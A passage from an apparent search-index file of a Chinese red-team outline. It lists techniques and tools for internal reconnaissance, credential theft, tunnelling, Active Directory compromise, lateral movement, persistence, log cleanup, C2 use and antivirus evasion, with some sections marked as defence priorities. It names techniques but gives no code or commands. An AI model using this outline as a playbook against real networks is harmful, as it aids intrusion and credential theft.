\u5185\u7f51\u5404\u7c7b\u5e38\u89c4\u8d44\u4ea7\u72b6\u6001\u76d1\u63a7\u670d\u52a1\u5668,eg: zabbix,nagios,cacti... \u5185\u7f51\u5404\u7c7b\u9632\u62a4\u7684\u4e3b\u63a7\u7aef,\u6bd4\u5982,\u9632\u706b\u5899,EDR,\u6001\u52bf\u611f\u77e5 \u4ea7\u54c1\u7684web\u4e3b\u63a7\u7aef... \u5185\u7f51\u65e5\u5fd7\u670d\u52a1\u5668 \u5185\u7f51\u8865\u4e01\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bOA,ERP,CRM,SRM,HR\u7cfb\u7edf... \u5185\u7f51\u6253\u5370\u670d\u52a1\u5668 \u5185\u7f51 MES \u7cfb\u7edf \u5185\u7f51\u865a\u62df\u5316\u670d\u52a1\u5668 / \u8d85\u878d\u5408\u5e73\u53f0 [Vmware ESX] \u5185\u7f51\u5821\u5792\u673a... \u5185\u7f51\u8fd0\u7ef4,\u7814\u53d1 \u90e8\u95e8\u5458\u5de5\u7684\u673a\u5668 \u5185\u7f51\u8def\u7531,\u4ea4\u6362\u8bbe\u5907... \u7b49\u7b49\u7b49 ... \u9488\u5bf9\u4ee5\u4e0a\u7684\u5404\u79cd\u5e38\u89c4\u5185\u7f51\u63a2\u6d4b\u626b\u63cf,\u5176\u5b9e\u5728\u6d41\u91cf\u4e0a\u90fd\u4f1a\u6709\u975e\u5e38\u6e05\u6670\u7684\u8868\u73b0 \u901a\u8fc7\u5728\u4e00\u4e9b\u5173\u952e\u8282\u70b9\u8bbe\u5907/\u670d\u52a1\u5668\u4e0a\u90e8\u7f72\u63a2\u9488\u641c\u96c6\u6d41\u91cf,\u518d\u914d\u5408\u5927\u6570\u636e\u5173\u8054\u5206\u6790\u67e5\u627e\u5404\u79cd\u654f\u611f\u7279\u5f81,\u7406\u8bba\u4e0a\u662f\u76f8\u5bf9\u5bb9\u6613\u53d1\u73b0\u5404\u7c7b\u626b\u63cf\u63a2\u6d4b\u75d5\u8ff9\u7684, \u9488\u5bf9\u5404\u7c7b\u5df2\u77e5\u7cfb\u7edf\u9ad8\u5371RCE\u6f0f\u6d1e\u7684\u6279\u91cf\u63a2\u6d4b\u8bc6\u522b\u4e0e\u5229\u7528 MS08-067 [ \u5176\u5b9e,\u67d0\u4e9b\u7279\u6b8a\u884c\u4e1a\u7684\u7cfb\u7edf\u53ef\u80fd\u975e\u5e38\u8001,\u6781\u5c11\u66f4\u65b0,\u6545,\u8fd8\u662f\u6709\u5b58\u5728\u7684\u53ef\u80fd ] MS17-010 CVE-2019-0708 \u5176\u5b9e\u9488\u5bf9\u6b64\u7c7b\u6f0f\u6d1e\u7684\u653b\u51fb\u5229\u7528\u8bc6\u522b,\u5c31\u663e\u5f97\u6bd4\u8f83\u76f4\u767d\u4e86,\u901a\u8fc7\u6df1\u5165\u5206\u6790\u6bcf\u79cd\u6f0f\u6d1e\u5728\u5b9e\u9645\u653b\u51fb\u5229\u7528\u8fc7\u7a0b\u6240\u4ea7\u751f\u7684\u4e00\u4e9b\u5178\u578b\u6d41\u91cf\u7279\u5f81\u548c\u7cfb\u7edf\u65e5\u5fd7\u5373\u53ef\u5927\u81f4\u5224\u65ad","title":"0x06 \u5185\u7f51\u5b89\u5168 [ \u654f\u611f\u4fe1\u606f\u641c\u96c6\uff0c\u9632\u5fa1\u91cd\u70b9\uff0c\u53ef\u5728\u6b64\u9879\u4e25\u683c\u9650\u5236\u5404\u79cd\u7cfb\u7edf\u5185\u7f6e\u547d\u4ee4\u6267\u884c ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x07","text":"\u4e3b\u52a8\u5bc6\u7801\u641c\u96c6 \u6ce8:\u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u6216\u8005\u5728\u6307\u5b9a\u7528\u6237\u6743\u9650\u4e0b\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684 \u6b64\u5904\u4e0d\u518d\u8d58\u8ff0, \u6b64\u9879\u975e\u9632\u5fa1\u91cd\u70b9, \u56e0\u4e3a\u538b\u6839\u4e5f\u4e0d\u597d\u9632 \u6279\u91cf\u6293\u53d6\u5f53\u524d\u673a\u5668\u4e0a\u7684 \"\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\" \u6bd4\u5982,\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u914d\u7f6e\u6587\u4ef6,\u5404\u7c7b\u670d\u52a1\u81ea\u8eab\u7684\u914d\u7f6e\u6587\u4ef6(redis,http basic...)... \u60f3\u529e\u6cd5 \"\u63a7\u5236\u76ee\u6807 \u8fd0\u7ef4\u7ba1\u7406 / \u6280\u672f\u4eba\u5458 \u7684\u5355\u673a,\u4ece\u8fd9\u4e9b\u673a\u5668\u4e0a\u53bb\u641c\u96c6\u53ef\u80fd\u4fdd\u5b58\u7740\u5404\u7c7b\u654f\u611f\u7f51\u7edc\u8d44\u4ea7\u7684\u8d26\u53f7\u5bc6\u7801\u8868\" \u6bd4\u5982, .ls,.doc,*.docx, *.txt.... \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 \u6bd4\u5982,Navicat,SSMS[MSSQL\u81ea\u5e26\u5ba2\u6237\u7aef\u7ba1\u7406\u5de5\u5177,\u91cc\u9762\u4e5f\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u5bc6\u7801(\u52a0\u5bc6\u540e\u7684base64)] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf \"\u6ce8\u518c\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" [ Windows ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709 \"\u672c\u5730\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801/hash\" [ Windows & linux ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 \"\u7528\u6237token\" [ Windows ] \u6293\u53d6 \"windows\u51ed\u636e\u7ba1\u7406\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6 \"MSTSC \u5ba2\u6237\u7aef\u4e2d\u4fdd\u5b58\u7684\u6240\u6709rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6\u5404\u7c7b \"VNC\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u8fde\u63a5\u5bc6\u7801\" \u6293\u53d6 \"GPP\u76ee\u5f55\u4e0b\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801\" [ \u5305\u62ec\u7ec4\u7b56\u7565\u76ee\u5f55\u4e2dXML\u91cc\u4fdd\u5b58\u7684\u5bc6\u7801hash \u548c NETLOGON\u76ee\u5f55\u4e0b\u7684\u67d0\u4e9b\u811a\u672c\u4e2d\u4fdd\u5b58\u7684\u8d26\u53f7\u5bc6\u7801 ] \u6293\u53d6\u5404\u7c7b \"SSH\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdlinux\u7cfb\u7edf\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\", SecureCRT,Xshell,WinSCP,putty \u6293\u53d6\u5404\u7c7b \"\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdweb\u767b\u5f55\u5bc6\u7801\",Chrome [360\u6d4f\u89c8\u5668],Firefox,IE,QQ\u6d4f\u89c8\u5668 \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" \u6293\u53d6\u5404\u7c7b \"FTP\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdftp\u767b\u5f55\u8d26\u53f7\u5bc6\u7801\", filezila, xftp... \u6293\u53d6\u5404\u7c7b \"\u90ae\u4ef6\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\", forxmail, thunderbird... \u6293\u53d6\u5404\u7c7b \"SVN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u6240\u6709\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\u53ca\u9879\u76ee\u5730\u5740\" \u6293\u53d6\u5404\u7c7b \"VPN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdvpn\u94fe\u63a5\u8d26\u53f7\u5bc6\u7801\" \u88ab\u52a8\u5bc6\u7801\u641c\u96c6 [ \u7b49\u7740\u7ba1\u7406\u5458\u81ea\u5df1\u6765\u9001\u5bc6\u7801 ] [\u6ce8: \u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684, \u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 , \u662f\u9632\u5fa1\u91cd\u70b9] Windows SSP [\u6301\u4e45\u5316/\u5185\u5b58] Hook PasswordChangeNotify [\u6301\u4e45\u5316/\u5185\u5b58] OWA \u767b\u5f55\u8d26\u53f7\u5bc6\u7801\u622a\u83b7 \u622a\u83b7mstsc.exe\u4e2d\u8f93\u5165\u7684rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 linux \u522b\u540d\u8bb0\u5f55\u5229\u7528 \u672c\u673a\u660e\u6587\u5bc6\u7801\u55c5\u63a2 [ http,ftp,pop3... ] \u4f20\u7edf\u952e\u76d8\u8bb0\u5f55 windows\u84dd\u5c4f\u6280\u5de7 [ \u6b64\u64cd\u4f5c\u4e3b\u8981\u4e3a\u5e94\u5bf9\u4e0d\u65f6\u4e4b\u9700,\u6bd4\u5982,\u641e\u84dd\u5c4f,\u767b\u7ba1\u7406\u5458\u767b\u5f55\u6293\u5bc6\u7801 ] Hash\u7206\u7834: Hashcat [ \u5b8c\u5168\u62fcGPU ]","title":"0x07 \u5185\u7f51\u5b89\u5168 [ \u5404\u7c7b\u654f\u611f\u51ed\u8bc1 \"\u641c\u96c6\" \u4e0e \"\u7a83\u53d6\" ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x08","text":"\u51fa\u7f51\u6d41\u91cf\u523a\u63a2 \u6bd4\u5982,http,dns,\u4ee5\u53ca\u4e00\u4e9b\u7a7f\u900f\u6027\u76f8\u5bf9\u8f83\u597d\u7684tcp\u7aef\u53e3... \u8fd9\u79cd\u64cd\u4f5c\u4e00\u822c\u90fd\u4f1a\u914d\u5408wmi,smb,ssh\u8fdc\u7a0b\u6267\u884c,\u5728\u5185\u7f51\u6279\u91cf\u5feb\u901f\u8bc6\u522b\u51fa\u80fd\u51fa\u7f51\u7684\u673a\u5668 \u5e38\u89c4 HTTP\u811a\u672c\u4ee3\u7406 abptts,Neo-reGeorg,reGeorg,tunna,reduh... \u4e0d\u5f97\u4e0d\u8bf4,\u516c\u5f00\u811a\u672c\u5728\u5b9e\u6218\u4e2d\u591a\u591a\u5c11\u5c11\u90fd\u4f1a\u6709\u4e9b\u95ee\u9898,\u8fd8\u9700\u8981\u6839\u636e\u81ea\u5df1\u7684\u5b9e\u9645\u76ee\u6807\u73af\u5883\u6df1\u5ea6\u6539\u8fdb\u624d\u884c SSH \u96a7\u9053 \u52a0\u5bc6\u7aef\u53e3\u8f6c\u53d1,socks \u5b9e\u6218\u7528\u9014\u975e\u5e38\u7075\u6d3b,\u6b64\u5904\u4e0d\u7ec6\u8bf4 ] Rdp \u96a7\u9053 \u53cd\u5411SOCKS nps, frp, ssf, CobaltStrike(socks4a & rportfwd ), sscoks ... \u5de5\u5177\u57fa\u672c\u90fd\u4e0d\u514d\u6740\u4e86,\u9700\u8981\u81ea\u884c\u5904\u7406 \u6b63\u53cd\u5411TCP \u7aef\u53e3\u8f6c\u53d1 \u975e\u5e38\u591a,\u5c31\u4e0d\u4e00\u4e00\u5217\u4e3e, eg: nginx,netsh,socat,ew.... DNS\u52a0\u5bc6\u96a7\u9053 Web\u7aef\u53e3\u590d\u7528 \u9700\u8981\u660e\u767d\u7684\u662f,\u5728\u4e00\u822c\u7684\u7ea2\u961f\u573a\u666f\u4e2d \u5165\u4fb5\u8005\u4e3a\u4e86\u5c3d\u53ef\u80fd\u8eb2\u907f\u5404\u79cd\u68c0\u6d4b\u8bbe\u5907\u7684\u6d41\u91cf\u89e3\u6790,\u5f88\u591a\u6b64\u7c7b\u5de5\u5177\u90fd\u4f1a\u91c7\u7528\u5404\u79cd\u5404\u6837\u7684\u65b9\u5f0f\u6765\u52a0\u5bc6\u4f20\u8f93\u6d41\u91cf,\u4ee5\u6b64\u6765\u4fdd\u8bc1\u81ea\u5df1\u6709\u66f4\u5f3a\u7684\u7a7f\u900f\u6027","title":"0x08 \u5185\u7f51\u5b89\u5168 [ \u5185\u7f51\u5e38\u7528 \"\u96a7\u9053\"\" / \"\u8f6c\u53d1\"\" / \"\u4ee3\u7406\"\" \u7a7f\u900f\u624b\u6cd5 \u63d0\u70bc\u6c47\u603b \uff0c\u9632\u5fa1\u91cd\u70b9 ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x09","text":"\u9488\u5bf9\u5f53\u524d\u57df\u7684\u4e00\u4e9b\u5e38\u89c4\u4fe1\u606f\u641c\u96c6[ \u5176\u5b9e\u73b0\u5b9e\u4e2d,\u53ea\u9700\u8981\u4e00\u4e2aBloodHound & Pingcastle\u8db3\u77e3,\u5c31\u662f\u5de5\u5177\u9700\u8981\u81ea\u884c\u4e8b\u5148\u514d\u6740\u597d] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u5b8c\u6574\u57df\u7ba1\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u57df\u63a7\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709DNS\u670d\u52a1\u5668\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709SPN \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709OU \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u7528\u6237 & \u7528\u6237\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u4fe1\u4efb\u5173\u7cfb [ \u8de8\u57df\u6e17\u900f ] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u7684\u5f00\u673a\u65f6\u95f4 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7f51\u6bb5\u53caweb\u7ad9\u70b9 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7b56\u7565 [ \u4e3b\u8981\u662f\u4e3a\u4e86\u4e86\u89e3\u5bc6\u7801\u7b56\u7565 ] \u83b7\u53d6\u5f53\u524d\u57df\u6797 ....... \u5feb\u901f\u83b7\u53d6\u76ee\u6807\u57df\u63a7\u6743\u9650\u7684\u4e00\u4e9b\u5e38\u89c4\u624b\u6cd5 \u641c\u96c6GPP \u76ee\u5f55 [ \u5176\u4e2d\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u57df\u8d26\u53f7\u5bc6\u7801,\u4e0d\u4ec5\u4ec5\u662f\u5b58\u5728XML\u91cc\u7684\u90a3\u4e9b,NETLOGON\u76ee\u5f55\u4e2d\u7684\u67d0\u4e9b\u811a\u672c\u540c\u6837\u4e5f\u53ef\u80fd\u4fdd\u5b58\u6709\u8d26\u53f7\u5bc6\u7801 ] \u670d\u52a1\u7968\u636ehash\u7834\u89e3(\"\u5c24\u5176\u662f\u57df\u7ba1\u7528\u6237\u7684\") [ kerberoast ] \u6279\u91cf\u5bf9\u57df\u7528\u6237\u8fdb\u884c\u5355\u5bc6\u7801\u5c1d\u8bd5 [ \u55b7\u5c04,\u5229\u7528ADSI\u63a5\u53e3,\u65e5\u5fd7id 4771 ] Kerberos \u59d4\u6d3e\u5229\u7528 \u7206\u7834LDAP Exchange\u7279\u5b9aACL\u6ee5\u7528 SSP \u622a\u83b7\u5173\u952e\u670d\u52a1\u5668\u767b\u5f55\u5bc6\u7801 \u5229\u7528\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u5728\u5185\u7f51\u5feb\u901f getshell [ \u5f31\u53e3\u4ee4, \u5404\u7c7bJAVA\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e, \u5e38\u89c4Web\u6f0f\u6d1e... ],\u5728\u5185\u7f51\u5faa\u73af\u6293\u5404\u7c7b\u5bc6\u7801,\u76f4\u81f3 \u6293\u5230\u57df\u7ba1\u5bc6\u7801 \u6293\u5230\u57df\u7ba1\u4ee4\u724c DNSAdmin \u7ec4\u6210\u5458\u6ee5\u7528 [ \u52a0\u8f7d\u6267\u884c\u6076\u610fdll ] LAPS MS14-068 [ \u5982\u4eca\u5b9e\u9645\u4e2d\u5df2\u5f88\u5c11\u9047\u5230\u4e86 ] LLMNR/NBNS\u6b3a\u9a97 + SMB relay [ \u771f\u5b9e\u5728\u5b9e\u6218\u4e2d\u5176\u5b9e\u7528\u7684\u5e76\u4e0d\u591a ] \u57df\u5185\u540e\u6e17\u900f\u654f\u611f\u4fe1\u606f\u641c\u96c6\u5206\u6790 \u83b7\u53d6\u6240\u6709DNS\u8bb0\u5f55 \u5bfc\u51fa\u5f53\u524d\u57df\u7684\u5b8c\u6574LDAP\u6570\u636e\u5e93 \u63d0\u53d6\u5f53\u524d\u57df\u7684ntds.dit [ \u57df\u5185\u8d26\u53f7\u5bc6\u7801\u6570\u636e\u5e93 ] Dcsync\u540c\u6b65 Volume Shadow Copy Service \u57df\u5185\u6307\u5b9a\u7528\u6237\u767b\u5f55ip\u5b9a\u4f4d \u5229\u7528OWA\u767b\u5f55\u65e5\u5fd7 \u5229\u7528\u57df\u63a7\u670d\u52a1\u5668\u767b\u5f55\u65e5\u5fd7 \u6307\u5b9a\u670d\u52a1\u94f6\u7968 [ Silver Ticket ] \u9664\u6b64\u4e4b\u5916,\u5c31\u662f\u4e0b\u9762\u7684\u5404\u7c7b\u5e38\u89c4\u6a2a\u5411\u624b\u6cd5 \u57df\u5185\u6307\u5b9a\u7528\u6237\u673a\u5668\u5b9a\u5411\u63a7\u5236\u6280\u5de7 \u7ed1\u5b9a\u7528\u6237\u767b\u5f55\u811a\u672c \u5229\u7528GPO\u4e0b\u53d1 [\u5b9e\u9645\u4e0a,\u5229\u7528GPO\u80fd\u505a\u7684\u4e8b\u60c5\u8fd8\u975e\u5e38\u975e\u5e38\u591a] PTT [ \u7968\u636e\u4f20\u9012 ] \u9488\u5bf9\u57df\u7ba1\u7684\u5404\u79cd\u6743\u9650\u7ef4\u6301\u6280\u5de7 \u91d1\u7968 Skeleton Key DSRM\u5bc6\u7801\u540c\u6b65 OWA\u540e\u95e8 ... \u57df\u5185Exchange \u90ae\u4ef6\u6570\u636e\u8131\u53d6 \u5229\u7528Ews\u63a5\u53e3\u901a\u8fc7PTH\u7684\u65b9\u5f0f\u8131\u90ae\u4ef6","title":"0x09 \u57df\u5185\u7f51\u5b89\u5168 [ \u57df\u5185\u5e38\u7528\u653b\u51fb\u624b\u6cd5 ( \u57df\u6e17\u900f )\uff0c\u63d0\u70bc\u6c47\u603b\uff0c\u9632\u5fa1\u91cd\u70b9 ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x10","text":"\u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows\u5e73\u53f0 \u6ce8: \u4ee5\u4e0b\u67d0\u4e9b\u8fdc\u7a0b\u6267\u884c\u65b9\u5f0f, \u5373\u53ef\u76f4\u63a5\u7528\u660e\u6587\u8d26\u53f7\u5bc6\u7801 \u4ea6\u53ef \u57fa\u4e8epth\u6765\u8fdb\u884c, \u4e0d\u5c40\u9650 \u8fdc\u7a0b\u670d\u52a1\u7ba1\u7406 [ SCM ] \u8fdc\u7a0b\u521b\u5efa\u6267\u884c\u8ba1\u5212\u4efb\u52a1 [ Scheduled Tasks ] WMI \u8fdc\u7a0b\u6267\u884c [ WMI ] \u9488\u5bf9\u9ad8\u7248\u672cWindows \u7684WinRM \u8fdc\u7a0b\u6267\u884c DCOM \u8fdc\u7a0b\u6267\u884c [ \u9700\u8981\u76ee\u6807Windows\u673a\u5668\u4e8b\u5148\u5df2\u5173\u95ed\u9632\u706b\u5899 ] \u9ad8\u7248\u672c RDP \u8fdc\u7a0b\u6267\u884c \u5229\u7528MSSQL\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c \u5229\u7528Oracle\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c SMB [ PTH (hash\u4f20\u9012) ] RDP[MSTSC] \u53cd\u5411\u6e17\u900f [ \u5373\u53ef\u7528\u4e8e\u7a81\u7834\u67d0\u4e9b\u9694\u79bb, \u4ea6\u53ef\u901a\u8fc7\u4e91(Windows vps)\u76f4\u63a5\u53cd\u63a7\u76ee\u6807\u7ba1\u7406\u5458\u4e2a\u4eba\u673a CVE-2019-0887 ] \u5229\u7528\u8865\u4e01\u670d\u52a1\u5668\u4e0b\u53d1\u6267\u884c \u5229\u7528EDR\u4e3b\u63a7\u7aef\u5b9a\u5411\u4e0b\u53d1\u6267\u884c \u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux\u5e73\u53f0 plink \u6216\u8005 \u57fa\u4e8eWindows SSH\u5e93\u81ea\u884c\u5f00\u53d1\u5404\u79cd\u8fdc\u7a0b\u6267\u884c\u5c0f\u5de5\u5177 \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows \u5e73\u53f0 \u4e00\u822c\u90fd\u4f1a\u5c06 impacket\u5957\u4ef6\u4e2d\u7684\u5404\u4e2a\u5e38\u7528py\u811a\u672c\u4e8b\u5148\u76f4\u63a5\u6253\u5305\u6210\u53ef\u6267\u884c\u6587\u4ef6, \u7136\u540e\u4e22\u5230\u76ee\u6807linux\u7cfb\u7edf\u4e2d\u53bb\u6267\u884c,\u5982\u4e0b wmiexec_linux_x86_64 smbexec_linux_x86_64 psexec_linux_x86_64 atexec_linux_x86_64 dcomexec_linux_x86_64 \u53e6\u5916,\u8fd8\u6709\u4e00\u4e9b\u57fa\u4e8ego\u7684\u5de5\u5177,\u540c\u6837\u4e5f\u53ef\u4ee5\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6\u4e4b\u540e\u518d\u4e22\u4e0a\u53bb\u6267\u884c \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux \u5e73\u53f0 linux \u81ea\u5e26\u7684ssh\u5ba2\u6237\u7aef\u5de5\u5177\u5957\u4ef6, \u9ed8\u8ba4\u5c31\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c \u5404\u79cd\u8fdc\u7a0b\u4e0b\u8f7d\u6280\u5de7 wget [ win & linux ] curl [ win & linux ] \u4e4b\u6240\u4ee5\u6ca1\u7740\u91cd\u63d0\u4ee5\u4e0b\u8fd9\u4e9b\u7cfb\u7edf\u5185\u7f6e\u7684\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u5de5\u5177,\u4e3b\u8981\u8fd8\u662f\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u660e\u786e\u77e5\u9053 \u67d0\u4e9b\u6740\u8f6f\u73af\u5883\u4e0b\u5b83\u80af\u5b9a\u4f1a\u88ab\u62e6\u622a,\u6240\u4ee5\u4e8b\u5148\u5c31\u76f4\u63a5\u628a\u5b83\u5f03\u7528\u4e86,\u5c24\u5176\u9488\u5bf9\u7ea2\u961f\u8fd9\u79cd\u573a\u666f,\u8fd9\u4e9b\u4e1c\u897f\u6839\u672c\u4e0d\u5728\u4e4e\u591a,\u6709\u4e00\u4e2a\u80fd\u7528\u597d\u7528\u7684\u5373\u53ef CertUtil.exe Bitsadmin.exe Regsvr32.exe Rundll32.exe Powershell.exe ......","title":"0x10 \u5185\u7f51\u5b89\u5168 [ \u8de8\u5e73\u53f0\u6a2a\u5411\u6e17\u900f (\u8fdc\u7a0b\u6267\u884c)\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x11","text":"\u8fb9\u754c\u5165\u53e3\u6743\u9650\u7ef4\u6301 OWA \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,webshell ] VPN \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,shell ] \u5176\u4ed6 MAIL \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801 ] \u8fb9\u754c Web\u670d\u52a1\u5668 [ Webshell \u9a7b\u7559\u6280\u5de7 ] \u8fb9\u754c\u8def\u7531\u4ea4\u6362\u8bbe\u5907 [ \u8d26\u53f7\u5bc6\u7801,shell ] ... Windows \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 [ \u9ad8\u6743\u9650/\u4f4e\u6743\u9650 ] \u5e38\u89c4\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u9879 [ \u7528\u6237\u6743\u9650/system\u6743\u9650 ] Mssql\u5b58\u50a8\u8fc7\u7a0b [ \u7ee7\u627f\u670d\u52a1\u6743\u9650 ] WMI Winlogon CLR Logon Scripts MruPidlList Mof \u4f20\u7edf\u8fdc\u63a7 ... linux \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] Patch SSH \u66ff\u6362\u5404\u7c7b\u57fa\u7840\u670d\u52a1so [ PAM,Nginx,Rsync ...] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 \u4f20\u7edf\u5e94\u7528\u5c42\u8fdc\u63a7 \u9a71\u52a8\u5c42\u8fdc\u63a7( \u9488\u5bf9\u7279\u5b9a\u5185\u6838\u7248\u672c )","title":"0x11 \u5185\u7f51\u5b89\u5168 [ \u6743\u9650\u7ef4\u6301\uff0c\u9632\u5fa1\u91cd\u70b9 ] [ \u6ce8: \u6709\u4e9b\u7ec6\u8282\u6b64\u5904\u5e76\u672a\u5c55\u5f00\u8be6\u7ec6\u8bf4\u660e ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x12","text":"web\u65e5\u5fd7 [ \u8bbf\u95ee, \u9519\u8bef\u65e5\u5fd7 ] \u6570\u636e\u5e93\u65e5\u5fd7 [ \u5f02\u5e38\u8fde\u63a5\u65e5\u5fd7,\u6162\u67e5\u8be2\u65e5\u5fd7 ] \u7cfb\u7edf\u5404\u7c7b\u5b89\u5168\u65e5\u5fd7 [ ssh,rdp,smb,wmi,powershell....] \u5404\u7c7b\u90ae\u7bb1\u767b\u5f55\u65e5\u5fd7 \u57df\u5185\u654f\u611f\u653b\u51fb\u5229\u7528\u65e5\u5fd7 [ \u91d1\u7968,\u94f6\u7968... ] \u6b64\u9879\u4e3a\u4e13\u4e1a\u84dd\u961f\u8303\u7574,\u4e0d\u518d\u8d58\u8ff0 ......","title":"0x12 \u75d5\u8ff9\u5904\u7406"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x13-c2","text":"CobaltStrike [\u4e8c\u6b21\u5f00\u53d1] payload(beacon) \u9006\u5411/\u6539\u8fdb\u91cd\u5199 Metasploit [\u4e8c\u6b21\u5f00\u53d1] ......","title":"0x13 \u5404\u7c7b\u5e38\u7528 C2 / \u6e17\u900f \u6846\u67b6"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x14-webshell","text":"\u83dc\u5200 caidao20160622 \u51b0\u87f9 Behinder_v2.0.1 \u8681\u5251 AntSword ......","title":"0x14 \u5404\u7c7b\u5e38\u7528 Webshell\u7ba1\u7406\u5de5\u5177"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x15","text":"\u9759\u6001 \u6df7\u6dc6: \u624b\u5de5\u6df7\u6dc6,\u6709\u6e90\u7801\u7684\u60c5\u51b5\u4e0b,\u5c1d\u8bd5\u9010\u4e2a\u66ff\u6362\u53ef\u80fd\u662f\u5173\u952e\u7279\u5f81\u5b57\u7b26\u4e32\u7684 \u547d\u540d\u7a7a\u95f4\u540d, \u51fd\u6570\u540d, \u53d8\u91cf\u540d, \u5b57\u7b26\u4e32 